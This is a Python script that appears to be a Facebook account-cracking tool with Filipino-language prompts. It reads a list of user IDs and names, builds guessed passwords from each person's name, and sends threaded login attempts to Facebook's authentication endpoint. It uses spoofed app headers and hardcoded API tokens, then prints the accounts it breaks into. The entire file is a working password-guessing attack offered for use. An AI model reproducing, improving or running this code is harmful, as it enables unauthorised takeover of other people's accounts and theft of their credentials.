#WRITTEN BY MR.DIPTO
#FOLLOW MY GITHUB : https://github.com/MR-DIPTO-404
#----------import----------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random 
import httpx
import json
import sys
#----------logo----------#
logo=('''                       
\033[1;32m 
 \033[1;32m
                                      
                   )                  
  (     (       ( /(            (     
  )\   ))\  (   )\()) (     (   )\ )  
 ((_) /((_) )\ (_))/  )\ )  )\ (()/(  
   ! (_))( ((_)| |_  _(_/( ((_) )(_)) 
  | || || |(_-<|  _|| ' \))(_-<| || | 
 _/ | \_,_|/__/ \__||_||_| /__/ \_, | 
|__/                            |__/  

                                                   
 
••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
  \033[1;32mAuthor  : justine sy
  \033[1;32mFacebook : justine.syxd
••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;32m ''')
#----------clear----------#
def clear():
    os.system('clear')
    print(logo)
    print(50*'-')
    print(' Tool: File Clowning')
    print(' Version: SUBOK')
    print(' Sheeees Fail on 🔥 ')
    print(50*'-')
#----------line----------#
def line():
    print(50*'-')
#----------menu----------#
def main():
    clear()
    print(' [1] FILE CLOWNING ')
    print(' [2] EXIT ')
    line()
    option=input('  PILI KA : ')
    if option in ['01','1']:
        __file__()
    else:
        exit(' THANKS FOR USING ')
#----------file----------#
def __file__():
    clear()
    filex=input('  ENTER FILE PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(' File not found !!');slp(2)
        __file__()
    clear()
    try:
        pas_limit=int(input(' ENTER PASSWORD LIMIT (20 MAX) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f' ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as Dipto:
        tl=str(len(fo))
        clear()
        print(' LAHAT NANG ACCOUNT : '+tl)
        print(' MAG EROPLANO KADA 2 MINUTO ')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            Dipto.submit(m1,ids,names,passlist)
    line()
    print(' THE PROCESS HAS BEEN COMPLETE')
    input(' PRESS ENTER TO BACK : ')
    main()
loop=0
oks=[]
cps=[]
#----------method------------#
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r [TUMATAKBO] %s|BUHAY:%s '%(loop,len(oks)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={
            'User-Agent': '[FBAN/FB4A;FBAV/15.0.0.912;FBBV/3800125;[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000,40000)),
            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type': 'WIFI', 
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group': str(random.randint(1000,9999)), 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print('\r\r [BUHAY] '+ids+'|'+pas)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r [PATAY] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#----------end----------#
main()
